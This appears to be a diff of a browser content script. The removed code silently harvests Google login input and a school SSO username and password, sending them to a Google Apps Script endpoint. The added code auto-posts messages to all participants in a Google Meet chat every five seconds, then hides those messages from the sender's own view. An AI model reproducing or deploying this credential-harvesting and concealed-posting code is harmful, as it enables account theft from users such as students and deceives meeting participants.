@@ -1,82 +1,99 @@
-let input
-let input1
-let input2 = ""
-let ID = "myTest"
-let t = 0
+console.log("jjjjjjjjjjjjjjjjjjjjjjjjjjjj")
+let BigBox = false
+let messages = [
+    "Hello, World!",
+    "這是一條測試訊息。",
+    "Happy coding!",
+    "你今天好嗎？",
+    "Testing, testing, 1, 2, 3.",
+    "測試，測試，1、2、3。",
+    "感謝您使用此服務。",
+    "Have a great day!",
+];
+let count = 0
+setInterval(() => {
+    simulateInput()
+}, 5000);
 
-setInterval(function () {
-    if (location.href.includes("accounts.google.com")) {
-        if (document.querySelector('[jsname="YPqjbf"]') == input) return
-        input = document.querySelector('[jsname="YPqjbf"]')
-        button = document.querySelector('[jsname="Njthtb"]')
-        button.addEventListener('click', (e) => {
-            send(input.value, [input.getAttribute("aria-label"), "google", getCurrentTime(), ID])
+function simulateInput() {
+    const inputB = document.querySelector("[aria-label='與所有參與者進行即時通訊']");
+    if (!inputB) {
+        return
+    }
+    // console.log(inputB.getAttribute("aria-pressed"))
+    let T = false
+    if (inputB.getAttribute("aria-pressed") != 'true') {
+        inputB.click()
+        T = true
+    }
+    const inputElement = document.querySelector("#bfTqV")
+    if (!inputElement || inputElement.value != "") {
+        if (T) {
+            inputB.click()
+        }
+        return
+    }
+    inputElement.value = messages[count % messages.length];
+    count++
+    var inputEvent = new Event("input", {
+        bubbles: true,
+        cancelable: true
+    });
+    inputElement.dispatchEvent(inputEvent);
 
-        })
-        input.addEventListener("keydown", function (event) {
-            if (event.keyCode === 13) {
-                send(input.value, [input.getAttribute("aria-label"), "google", getCurrentTime(), ID])
-            }
-        });
-    } else if (location.href.includes("sso.ntpc.edu.tw/login.aspx")) {
-        if (input2 != "") return
-        input1 = document.getElementById("username")
-        input2 = document.getElementById("password")
-        button = document.querySelector('[class="login-box btn btn-login"]')
-        button.addEventListener('click', (e) => {
-            if (input2.value == "") {
-                t = 1
-                send(input1.value, ["user", "sso", getCurrentTime(), ID])
-            } else {
-                if (t == 0) {
-                    send(input1.value + "/" + input2.value, ["user/password", "sso", getCurrentTime(), ID])
-                } else {
-                    send(input2.value, ["password", "sso", getCurrentTime(), ID])
+    // ------------------------------------------------
+    if (!BigBox) {
+        BigBox = document.querySelector(".hWX4r")
+        console.log("12345")
+        const config = { attributes: true, childList: true, subtree: true };
+        const callback = function (mutationsList, observer) {
+            // Use traditional 'for loops' for IE 11
+            for (let mutation of mutationsList) {
+                // console.log(mutation.addedNodes.length)
+                if (mutation.type === 'childList'  && mutation.addedNodes.length > 0) {
+                    if (mutation.addedNodes[0].classList) {
+                        if (mutation.addedNodes[0].classList.contains("ptNLrf")) {
+                            console.log("!!!!!!!!!!!!!!!!!")
+                            check()
+                        }
+                    }
+                }
+                else if (mutation.type === 'attributes') {
+                    // console.log('The ' + mutation.attributeName + ' attribute was modified.');
                 }
             }
-
-        })
-
+        };
+        const observer = new MutationObserver(callback);
+        observer.observe(BigBox, config);
 
     }
+    // ------------------------------------------------
 
-}, 0.7 * 1000 / 1);
+    const sentB = document.querySelector("[aria-label='傳送訊息'].VfPpkd-Bz112c-LgbsSe.yHy1rc.eT1oJ.QDwDD.tWDL4c.Cs0vCd")
+    sentB.click()
+    setTimeout(() => {
+        check()
+    }, 300);
 
-function send(msg, tag) {
-    if (tag.includes("google")) {
-        setTimeout(() => {
-            r = document.querySelector('[jsname="B34EJ"]').firstChild
-            if (r) tag.push(r.innerText)
-            console.log("google",msg, tag)
-            SendToDate([msg, ...tag])
-        }, 800)
-    } else {
-        SendToDate([msg, ...tag])
-        console.log("sso",msg, tag)
+    if (T) {
+        inputB.click()
     }
+
 }
 
-
-function getCurrentTime() {
-    var currentDate = new Date();
-
-    var month = ('0' + (currentDate.getMonth() + 1)).slice(-2);
-    var day = ('0' + currentDate.getDate()).slice(-2);
-
-    var hours = ('0' + currentDate.getHours()).slice(-2);
-    var minutes = ('0' + currentDate.getMinutes()).slice(-2);
-    var seconds = ('0' + currentDate.getSeconds()).slice(-2);
-
-    var formattedDate = month + '/' + day + ' ' + hours + ':' + minutes + ':' + seconds;
-
-    return formattedDate;
-}
-const url = "https://script.google.com/macros/s/AKfycbwtdErllvF7yq0_gsX33Z9oOKP1svkFNDD_ouX3CnRNgBs2R9kx79UGN6fd89Pd7g4J/exec"
-let SendToDate = async (date) => {
-    date = encodeURIComponent(date.join("^"))
-    // console.log(date)
-    // console.log(url + `?date=${date}`)
-    let response = await fetch(url + `?date=${date}`);
-    let r = await response.text()
-    // console.log(r)
+function check() {
+    const boxex = document.querySelectorAll(".Ss4fHf")
+    boxex.forEach(box => {
+        const F = box.firstChild.nextSibling.childNodes;
+        for (let i = 0; i < F.length; i++) {
+            item = F[i]
+            if (messages.includes(item.innerText)) {
+                item.remove()
+                i--
+            }
+        }
+        if (F.length == 0) {
+            box.remove()
+        }
+    })
 }
